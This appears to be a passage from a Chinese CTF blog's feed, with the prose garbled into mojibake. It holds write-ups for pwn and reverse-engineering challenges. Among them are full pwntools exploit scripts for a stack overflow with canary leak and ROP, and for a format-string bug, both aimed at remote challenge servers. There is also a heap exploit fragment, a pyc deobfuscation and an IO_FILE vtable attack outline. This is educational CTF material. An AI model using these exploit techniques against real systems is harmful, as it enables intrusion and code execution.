p64(0x30)add(32,0xf8,payload)#32add(8,0x88,&quot;aaaa&quot;)add(9,0xf8,&quot;aaaa&quot;)add(10,0x88,&#39;aaaa&#39;)for i in range(7):    free(i+1) # ç”±äº32çš„å †å—ç”³è¯·åç ´åäº†0å·å †å—çš„åœ¨bssä¸Šåœ°å€çš„å‚¨å­˜payload = &#39;a&#39; * 0x80 + p64(0x180)edit(8,payload)free(9)payload = p64(0) * 3 + p64(0x00000000006021c8) + &#39;\x00&#39;  * (0xf0 - 0x8 * 4) + p64(0x0000000400000001)edit(32,payload)add(11,0x88,&#39; &#39;)show(11)r()libc_base = uu64(r(6)) - 0x3ebf20info_addr(&#39;libc_base&#39;,libc_base)free_hook = libc_base + 0x3ed8e8rec = rce18[1] + libc_basepayload = p64(0) * 3 + p64(free_hook)edit(32,payload)edit(32,p64(rec))free(11)itr()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›-twice</title>
    <link href="/2020/06/28/%E2%80%9C%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9D%20%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <url>/2020/06/28/%E2%80%9C%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9D%20%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="â€œç¬¬äº”ç©ºé—´â€-æ™ºèƒ½å®‰å…¨å¤§èµ›"><a href="#â€œç¬¬äº”ç©ºé—´â€-æ™ºèƒ½å®‰å…¨å¤§èµ›" class="headerlink" title="â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›"></a>â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›</h1><p>æ¯”èµ›æ—¶å½“å¤©æœ‰è€ƒè¯•ï¼Œå°±åšäº†ä¸ªç­¾é“é¢˜ã€‚</p><h2 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h2><h3 id="æŸ¥ä¿æŠ¤"><a href="#æŸ¥ä¿æŠ¤" class="headerlink" title="æŸ¥ä¿æŠ¤"></a>æŸ¥ä¿æŠ¤</h3><pre><code class="python">    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><ul><li>ç¨‹åºå¯ä»¥ç»™ä½ 2æ¬¡çš„è¯»æ“ä½œï¼Œç¬¬ä¸€æ¬¡è¯»89å­—èŠ‚ï¼Œç¬¬äºŒæ¬¡è¯»112å­—èŠ‚</li><li>æ ˆå¤§å°æ˜¯<code>0x60</code>ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚</li></ul><pre><code class="python">0x7fffffffe3b0 --&gt; 0x6097ecbc626822000x7fffffffe3b8 --&gt; 0x6097ecbc626822000128| 0x7fffffffe3c0 --&gt; 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:    push   r15)0136| 0x7fffffffe3c8 --&gt; 0x4008ad (&lt;main+50&gt;:    test   eax,eax)0144| 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:    push   r15)0152| 0x7fffffffe3d8 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)0160| 0x7fffffffe3e0 --&gt; 0x10168| 0x7fffffffe3e8 --&gt; 0x7fffffffe4b8 --&gt; 0x7fffffffe71f (&quot;/media/psf/mypwn/no5space/pwn&quot;)0176| 0x7fffffffe3f0 --&gt; 0x1f7ffcca0</code></pre><ul><li>è°ƒè¯•å‘ç°ç¬¬ä¸€æ¬¡readï¼Œå¯ä»¥leak canary å’Œä¸€ä¸ªæ ˆåœ°å€ï¼Œä»è€Œå¯ä»¥æ ¹æ®åç§»ç®—å‡ºæ ˆä¸Šå…¶ä»–æœ‰ç”¨çš„åœ°å€ã€‚</li><li>ç¬¬äºŒæ¬¡ï¼Œéœ€è¦å¡«å……ä¸€ä¸‹canaryï¼Œç„¶åå¯ä»¥å»æ”»å‡»ret address</li></ul><p>ä½†æ˜¯ï¼Œå¹¶æ²¡æœ‰æ‹¿åˆ°libcçš„åœ°å€ï¼Œæ˜¯æ— æ³•æ‹¿åˆ°shellã€‚<strong>ç”±äºå¯ä»¥æº¢å‡ºçš„å­—èŠ‚æœ‰é™ï¼Œä¹Ÿæ²¡æ³•è¿›è¡Œropã€‚</strong></p><h3 id="è·å–libcåœ°å€"><a href="#è·å–libcåœ°å€" class="headerlink" title="è·å–libcåœ°å€"></a>è·å–libcåœ°å€</h3><p>æ­¤æ—¶ï¼Œæ ¹æ®å‰é¢æ³„æ¼çš„æ ˆåœ°å€ï¼Œå¯ä»¥ç®—å‡ºreadå‡½æ•°çš„bufæ ˆåœ°å€ï¼Œç„¶å<strong>æ ˆè¿ç§»</strong>ä¸Šå»ï¼Œç„¶åè¿›è¡Œropæ¥leak å‡ºlibcåœ°å€ã€‚</p><p>æ‹¿åˆ°libcåœ°å€ä»¥åï¼Œropçš„ç»ˆç»“åœ°å€ä¸ºç¨‹åºçš„<code>start</code>ã€‚è®©å…¶æ¸…ç†æ ˆï¼Œå†æ¬¡è¿›è¡Œç¨‹åºçš„æ¼æ´åˆ©ç”¨ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;121.36.59.116&#39;,9999)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()# debug()payload = &quot;1&quot; * 0x57 + &#39;a&#39;sla(&quot;&gt;&quot;,payload)ru(&#39;a&#39;)canary = uu64(r(8)) - 0x0aprint(hex(canary))s_base = uu64(r(6)) - 0x70print(hex(s_base))  pop_rsi_pop_r15_ret = 0x0000000000400921pop_rbp_ret = 0x0000000000400690pop_rdi_ret = 0x0000000000400923leave_ret = 0x0000000000400879rop = flat([0,pop_rdi_ret,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],0x0400630])payload = rop.ljust(0x50,&#39;\0&#39;)payload += p64(canary) +p64(canary) + p64(s_base) + p64(leave_ret)# debug()sa(&quot;&gt;&quot;,payload)r(1)libc_base = uu64(r(6)) - libc.symbols[&#39;__libc_start_main&#39;]info_addr(&#39;libc_base&#39;,libc_base)sla(&quot;&gt;&quot;,&#39;1&#39;)ru(&#39;1&#39;)rop = flat([0,pop_rdi_ret,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],0x0400630])payload = rop.ljust(0x50,&#39;\0&#39;)payload += p64(canary) +p64(canary) + p64(libc_base+rce16[1]) + p64(libc_base+rce16[1])sla(&quot;&gt;&quot;,payload)itr()</code></pre><ul><li>æ³¨æ„åœ¨ç¬¬äºŒæ¬¡å‘é€payloadä¸è¦å‘å‡ºå»æ¢è¡Œç¬¦ã€‚</li><li>æœ€åä¸€æ¬¡payload ä¸­çš„ropä»€ä¹ˆçš„éƒ½æ˜¯æŠ„ç¬¬ä¸€æ¬¡çš„payloadï¼Œåªæ˜¯æŠŠæœ€åçš„ret address æ”¹æˆ one gadget ã€‚ï¼ˆåªæ˜¯å¡«å……å­—èŠ‚ç”¨çš„ï¼‰</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTFå®‰æ’æœˆèµ›(6th)</title>
    <link href="/2020/06/27/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(6th)/"/>
    <url>/2020/06/27/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(6th)/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTFå®‰æ’æœˆèµ›-6th"><a href="#DASCTFå®‰æ’æœˆèµ›-6th" class="headerlink" title="DASCTFå®‰æ’æœˆèµ›(6th)"></a>DASCTFå®‰æ’æœˆèµ›(6th)</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pyCharm-pycæ–‡ä»¶æ¢å¤"><a href="#pyCharm-pycæ–‡ä»¶æ¢å¤" class="headerlink" title="pyCharm(pycæ–‡ä»¶æ¢å¤)"></a>pyCharm(pycæ–‡ä»¶æ¢å¤)</h3><p>è¿™ä¸ªé¢˜åŸºæœ¬å‚è€ƒ<a href="https://www.52pojie.cn/thread-912103-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-912103-1-1.html</a>æ¥åšçš„ã€‚</p><h4 id="åŠ è½½pyc-co-code"><a href="#åŠ è½½pyc-co-code" class="headerlink" title="åŠ è½½pyc co_code"></a>åŠ è½½<code>pyc co_code</code></h4><pre><code>In [1]: import dis,marshalIn [2]: f=open(&#39;1.pyc&#39;)In [3]: f.read(4)Out[3]: &#39;\x03\xf3\r\n&#39;In [4]: f.read(4)Out[4]: &#39;jv\xe7^&#39;In [5]: code = marshal.load(f)In [6]: code.co_constsOut[6]:(-1, None, &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39;, &#39;Are u ready?&#39;, 0, 32, &#39;a&#39;, &#39;&#39;, &#39;great!waht u input is the flag u wanna get.&#39;, &#39;pity!&#39;)In [7]: code.co_varnamesOut[7]: ()In [8]: code.co_namesOut[8]:(&#39;base64&#39;, &#39;a&#39;, &#39;raw_input&#39;, &#39;flag&#39;, &#39;b64encode&#39;, &#39;c&#39;, &#39;list&#39;, &#39;d&#39;, &#39;range&#39;, &#39;i&#39;, &#39;join&#39;, &#39;ohh&#39;)In [9]: code.co_codeOut[9]: &quot;q\x03\x00q\x00\x06d\xffd\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x02\x00Z\x01\x00e\x02\x00d\x03\x00\x83\x01\x00Z\x03\x00e\x00\x00j\x04\x00e\x03\x00\x83\x01\x00Z\x05\x00e\x06\x00e\x05\x00\x83\x01\x00Z\x07\x00x&#39;\x00e\x08\x00d\x04\x00d\x05\x00\x83\x02\x00D]\x16\x00Z\t\x00e\x07\x00e\t\x00c\x02\x00\x19d\x06\x007\x03&lt;qI\x00Wd\x07\x00j\n\x00e\x07\x00\x83\x01\x00Z\x0b\x00e\x0b\x00e\x01\x00k\x02\x00r\x86\x00d\x08\x00GHn\x05\x00d\t\x00GHd\x01\x00S&quot;</code></pre><h4 id="ä½¿ç”¨disåº“å¯¹co-codeè¿›è¡Œåç¼–è¯‘"><a href="#ä½¿ç”¨disåº“å¯¹co-codeè¿›è¡Œåç¼–è¯‘" class="headerlink" title="ä½¿ç”¨disåº“å¯¹co_codeè¿›è¡Œåç¼–è¯‘:"></a>ä½¿ç”¨disåº“å¯¹<code>co_code</code>è¿›è¡Œåç¼–è¯‘:</h4><pre><code>In [10]: dis.dis(code.co_code)          0 JUMP_ABSOLUTE       3    &gt;&gt;    3 JUMP_ABSOLUTE    1536          6 LOAD_CONST      25855 (25855)          9 STOP_CODE         10 STOP_CODE         11 LOAD_CONST          1 (1)         14 IMPORT_NAME         0 (0)         17 STORE_NAME          0 (0)         20 LOAD_CONST          2 (2)         23 STORE_NAME          1 (1)         26 LOAD_NAME           2 (2)         29 LOAD_CONST          3 (3)         32 CALL_FUNCTION       1         35 STORE_NAME          3 (3)         38 LOAD_NAME           0 (0)         41 LOAD_ATTR           4 (4)         44 LOAD_NAME           3 (3)         47 CALL_FUNCTION       1         50 STORE_NAME          5 (5)         53 LOAD_NAME           6 (6)         56 LOAD_NAME           5 (5)         59 CALL_FUNCTION       1         62 STORE_NAME          7 (7)         65 SETUP_LOOP         39 (to 107)         68 LOAD_NAME           8 (8)         71 LOAD_CONST          4 (4)         74 LOAD_CONST          5 (5)         77 CALL_FUNCTION       2         80 GET_ITER         81 FOR_ITER           22 (to 106)         84 STORE_NAME          9 (9)         87 LOAD_NAME           7 (7)         90 LOAD_NAME           9 (9)         93 DUP_TOPX            2         96 BINARY_SUBSCR         97 LOAD_CONST          6 (6)        100 INPLACE_ADD        101 ROT_THREE        102 STORE_SUBSCR        103 JUMP_ABSOLUTE      73    &gt;&gt;  106 POP_BLOCK    &gt;&gt;  107 LOAD_CONST          7 (7)        110 LOAD_ATTR          10 (10)        113 LOAD_NAME           7 (7)        116 CALL_FUNCTION       1        119 STORE_NAME         11 (11)        122 LOAD_NAME          11 (11)        125 LOAD_NAME           1 (1)        128 COMPARE_OP          2 (==)        131 POP_JUMP_IF_FALSE   134    &gt;&gt;  134 LOAD_CONST          8 (8)        137 PRINT_ITEM        138 PRINT_NEWLINE        139 JUMP_FORWARD        5 (to 147)        142 LOAD_CONST          9 (9)        145 PRINT_ITEM        146 PRINT_NEWLINE    &gt;&gt;  147 LOAD_CONST          1 (1)        150 RETURN_VALUE</code></pre><p>è¿™é‡Œé¢éœ€è¦æ³¨æ„çš„å°±æ˜¯å¼€å¤´çš„ï¼š</p><pre><code>          0 JUMP_ABSOLUTE       3    &gt;&gt;    3 JUMP_ABSOLUTE    1536          6 LOAD_CONST      25855 (25855)          9 STOP_CODE         10 STOP_CODE</code></pre><p>æ˜æ˜¾åŠ å…¥äº†æ··æ·†ï¼Œæ€ä¹ˆçªç„¶å°±åœæ­¢äº†<code>STOP_CODE</code>ã€‚æ¥ç€å°±æ˜¯æƒ³åŠæ³•å»é™¤è¿™äº›æ··æ·†ï¼Œå’Œä¿®æ­£<code>co_code</code>é•¿åº¦ï¼ŒæœŸæœ›ä¿®æ”¹åçš„opcodeé¦–è¡Œä¸º</p><pre><code>0 LOAD_CONST 0(0)1 LOAD_CONST 1(1)</code></pre><p>å…¶ä¸­è¿™ç§äºŒè¿›åˆ¶å­—èŠ‚ç å¯¹åº”çš„ç¿»è¯‘ç»“æœï¼š</p><pre><code>0x64 æ“ä½œä¸ºLOAD_CONSTï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šLOAD_CONST 1        HEX: 6401000x71 æ“ä½œä¸ºJUMP_ABSOLUTEï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šJUMP_ABSOLUTE 14                HEX: 710e000x65 æ“ä½œä¸ºLOAD_NAMEï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šLOAD_NAME 1                HEX: 650100</code></pre><p>æ‰€ä»¥å¯»æ‰¾ï¼š</p><pre><code>0 LOAD_CONST 0(0)</code></pre><p>å³ä¸ºå¯»æ‰¾<code>HEX : 640000</code>è¿™ä¸ªä½œä¸ºæ··æ·†å­—æ®µç»“æŸã€‚<br>å¼€å¤´æ€ä¹ˆå¯»æ‰¾å‘¢ã€‚ç”±äºçœ‹å‰é¢3ä¸ªå­—èŠ‚å¯¹åº”ä¸€ä¸ªå«ä¹‰ï¼ŒçŒœæµ‹ï¼š</p><pre><code>0 JUMP_ABSOLUTE       3</code></pre><p>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼<br>ï¿¼ï¿¼ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/UceCOc.jpg" srcset="/img/loading.gif" alt></p><p>é‚£å¾ˆæ˜æ˜¾æ··æ·†å­—æ®µå°±æ˜¯ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bKDIpN.png" srcset="/img/loading.gif" alt></p><p>ç„¶åç”¨å·¥å…·åˆ é™¤å³å¯ï¼Œå…¶ä¸­0x97å°±æ˜¯<code>co_code</code></p><pre><code>In [12]: len(code.co_code)Out[12]: 151In [13]: hex(151)Out[13]: &#39;0x97&#39;</code></pre><p>æ‰€ä»¥å»é™¤è¿™8ä¸ªå­—èŠ‚çš„æ··æ·†ä»£ç ï¼Œç„¶åä¿®æ”¹<code>co_code</code>é•¿åº¦ä¸º<code>0x8f</code>ã€‚</p><h4 id="è¿˜åŸåçš„pycå¼€å¤´"><a href="#è¿˜åŸåçš„pycå¼€å¤´" class="headerlink" title="è¿˜åŸåçš„pycå¼€å¤´"></a>è¿˜åŸåçš„pycå¼€å¤´</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/imrvPr.png" srcset="/img/loading.gif" alt></p><h4 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h4><p>åç¼–è¯‘æ–¹æ³•å°±å¤šç§å¤šæ ·äº†ï¼Œå¯ä»¥åœ¨çº¿ä»€ä¹ˆçš„ï¼Œæˆ‘ä½¿ç”¨çš„<code>uncompyle6</code>.</p><pre><code>uncompyle6 -o 1.py 1.pyc</code></pre><pre><code># uncompyle6 version 3.7.1# Python bytecode 2.7 (62211)# Decompiled from: Python 2.7.16 (default, Feb 29 2020, 01:55:37)# [GCC 4.2.1 Compatible Apple LLVM 11.0.3 (clang-1103.0.29.20) (-macos10.15-objc-# Embedded file name: pyCharm.py# Compiled at: 2020-06-15 21:23:54import base64a = &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39;flag = raw_input(&#39;Are u ready?&#39;)c = base64.b64encode(flag)d = list(c)for i in range(0, 32):    d[i] += &#39;a&#39;ohh = (&#39;&#39;).join(d)if ohh == a:    print &#39;great!waht u input is the flag u wanna get.&#39;else:    print &#39;pity!&#39;%</code></pre><p>åç¼–è¯‘åè¿™é¢˜å°±ååˆ†ç®€å•äº†ã€‚</p><p>ç»™çš„å­—ç¬¦ä¸²æŠŠâ€œaâ€ï¼Œå»é™¤åè§£ç base64å³å¯ã€‚</p><h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a><code>easy_maze</code></h3><p>ç›´æ¥å»hexä¸‹æå–è¿·å®«ï¼Œç”±äºæ˜¯100ä¸ªå­—ç¬¦ï¼Œå¾ˆå®¹æ˜“è”æƒ³åˆ°æ˜¯10x10çš„è¿·å®«ã€‚<br>ç„¶åä¸¢vscodeã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/Y7wdYy.png" srcset="/img/loading.gif" alt><br>ç›´æ¥è·¯å¾„å°±å‡ºæ¥äº†ã€‚</p><pre><code>jkkjjhjjkjjkkkuukukkuuhhhuukkk</code></pre><p>Md5ä¸€ä¸‹å³å¯ã€‚</p><h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><p>é¢˜ç›®ä¸éš¾ï¼Œå¤ªèœäº†ï¼Œçœ‹c++æœ‰ç‚¹å¤´å¤§ï¼Œåšçš„æœ‰ç‚¹æ…¢ã€‚IdaåŠ¨æ€è°ƒè¯•ï¼Œä¸€å…±3ä¸ªcheckï¼Œéƒ½æ˜¯æ–­åœ¨<code>Strcmp</code>ã€‚æ¯æ¬¡éšä¾¿è¾“å…¥ï¼Œç„¶ååˆ†æå’Œè·å–rdiï¼Œrsiå¯„å­˜å™¨å¯¹åº”åœ°å€å¤„çš„å­—ç¬¦ä¸²ã€‚æ‹¿åˆ°ä»¥åï¼Œ3ä¸ªæ‹¼æ¥ä¸€ä¸‹å°±æ˜¯flagã€‚</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h3><p>è€ƒç‚¹å°±æ˜¯å †ä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ©ç”¨ï¼ŒæŒºç®€å•çš„ã€‚</p><h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><p> åˆ©ç”¨ç¯å¢ƒå˜é‡é‚£æ¡é“¾ï¼Œè¿›è¡Œæ”»å‡»<code>ret address</code>ï¼Œä¿®æ”¹ä¸ºone gadget<br>ç»™äº†8æ¬¡æ¼æ´åˆ©ç”¨æœºä¼šï¼Œè¿˜æ˜¯å¾ˆå®¹æ˜“å®ç°çš„ã€‚å…¶ä¸­<code>ret address</code>ï¼Œä¸º<code>__libc_start_main+xxx</code></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./springboard&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10029)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()sla(&quot;input&quot;,&quot;1&quot;)sla(&quot;input&quot;,&quot;2&quot;)sla(&quot;input&quot;,&quot;3&quot;)sla(&quot;input&quot;,&quot;%13$pAAAA%11$p&quot;)sleep(0.1)ru(&quot;0x&quot;)tag = int(r(12),16) - 0xe0ru(&quot;AAAA0x&quot;)libc_base = int(r(12),16) -0x21b97info_addr(&quot;libc_base&quot;,libc_base)key1 = hex(tag)[-4:]print(key1)payload = &#39;%{}c%13$hn&#39;.format(int(key1,16))sla(&quot;input&quot;,payload)sleep(5)rec = rce18[1] + libc_basekey2 = hex(rec)[-4:]print(key2)payload = &#39;%{}c%39$hn&#39;.format(int(key2,16))sla(&quot;input&quot;,payload)sleep(5)key3 = int(hex(tag)[-2:],16) + 2print(key3)payload = &#39;%{}c%13$hhn&#39;.format(key3)sla(&quot;input&quot;,payload)sleep(5)key4 = hex(rec)[-6:-4]print(key4)payload = &#39;%{}c%39$hhn&#39;.format(int(key4,16))sla(&quot;input&quot;,payload)itr()# 0000| 0x7fffffffe2f0 --&gt; 0x555555554980 (push   r15)# 0008| 0x7fffffffe2f8 --&gt; 0x55554780# 0016| 0x7fffffffe300 --&gt; 0x555555756010 (&quot;11111111aaaaaaaa1111111122222222\n&quot;)# 0024| 0x7fffffffe308 --&gt; 0x84fa9f2a7e35ae00# 0032| 0x7fffffffe310 --&gt; 0x555555554980 (push   r15)# 0040| 0x7fffffffe318 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)# 0048| 0x7fffffffe320 --&gt; 0x1# 0056| 0x7fffffffe328 --&gt; 0x7fffffffe3f8 --&gt; 0x7fffffffe67a (&quot;/media/psf/mypwn/ahys/6/springboard/springboard&quot;)# 0064| 0x7fffffffe330 --&gt; 0x1f7ffcca0# 0072| 0x7fffffffe338 --&gt; 0x55555555488a (push   rbp)# 0080| 0x7fffffffe340 --&gt; 0x0# 0088| 0x7fffffffe348 --&gt; 0x6e8193b15e1baa42# 0096| 0x7fffffffe350 --&gt; 0x555555554780 (xor    ebp,ebp)# 0104| 0x7fffffffe358 --&gt; 0x7fffffffe3f0 --&gt; 0x1# 0112| 0x7fffffffe360 --&gt; 0x0# 0120| 0x7fffffffe368 --&gt; 0x0# 0128| 0x7fffffffe370 --&gt; 0x3bd4c6e40b5baa42# 0136| 0x7fffffffe378 --&gt; 0x3bd4d65e62cbaa42# 0144| 0x7fffffffe380 --&gt; 0x0# 0152| 0x7fffffffe388 --&gt; 0x0# 0040| 0x7ffe4f08d2d8 --&gt; 0x7f2169b2a830</code></pre><h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>è€ƒç‚¹å°±æ˜¯<code>IO_FILE</code>çš„ç›¸å…³çŸ¥è¯†äº†ï¼Œæ˜¯é’ˆå¯¹ä¼ªé€  vtable åŠ«æŒç¨‹åºæµç¨‹ã€‚</p><p>è¿™ä¸ªé¢˜ä¼°è®¡æ˜¯å‚è€ƒ<a href="https://xz.aliyun.com/t/7205" target="_blank" rel="noopener">https://xz.aliyun.com/t/7205</a>è¿™ä¸ªé¢˜å‡ºçš„ï¼Œä½†æ˜¯æ–‡ä¸­çš„é¢˜æ¯”è¿™ä¸ªè¦éš¾å¤šäº†ã€‚ï¼ˆpsï¼šæ„Ÿè°¢å‡ºé¢˜äººæ‰‹ä¸‹ç•™æƒ…ï¼‰</p><h4 id="fclose-å‡½æ•°è°ƒç”¨çš„-vtable-å‡½æ•°"><a href="#fclose-å‡½æ•°è°ƒç”¨çš„-vtable-å‡½æ•°" class="headerlink" title="fclose å‡½æ•°è°ƒç”¨çš„ vtable å‡½æ•°"></a>fclose å‡½æ•°è°ƒç”¨çš„ vtable å‡½æ•°</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/QSynPX.png" srcset="/img/loading.gif" alt></p><p>vtable å‡½æ•° æŒ‡é’ˆï¼š</p><pre><code>/* The &#39;finish&#39; function does any final cleaning up of an _IO_FILE object.   It does not delete (free) it, but does everything else to finalize it.   It matches the streambuf::~streambuf virtual destructor.  */typedef void (*_IO_finish_t) (FILE *, int); /* finalize */#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)#define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0)struct _IO_jump_t{    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow);    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    /* showmany */    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);};</code></pre><p>å¯¹äºæ”»å‡»çš„vtable å‡½æ•° æŒ‡é’ˆå…¶ä¸­çš„ï¼š</p><ul><li><code>__finish__</code></li><li><code>__close</code></li></ul><p>å…¶æ‰§è¡Œé¡ºåºæ˜¯å…ˆcloseï¼Œç„¶åfinishã€‚ç”±äºç¨‹åºç»™çš„æ˜¯0x18å­—èŠ‚çš„ä»»æ„å†™ï¼Œæ”»å‡» <code>__finish__</code>å°±å¯ä»¥äº†ã€‚</p><h4 id="libc2-29ä¸­çš„vtable"><a href="#libc2-29ä¸­çš„vtable" class="headerlink" title="libc2.29ä¸­çš„vtable"></a>libc2.29ä¸­çš„vtable</h4><p>vtableçš„å€¼ï¼Œä»¥åŠå…¶å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨glibc 2.29ä¸‹æ˜¯å¯å†™çš„ã€‚è¿™ä¸ªæ˜¯å¾ˆé‡è¦çš„ä¸€ç‚¹ï¼Œæœ¬æ¥ä¸ªäººä¸çŸ¥é“è¿™ä¸ªï¼Œæƒ³äº†å¥½ä¹…å…¶ä»–çš„åŠæ³•æ¥åˆ©ç”¨ã€‚</p><p><strong>åœ¨glibc 2.23ä»¥åŠglibc 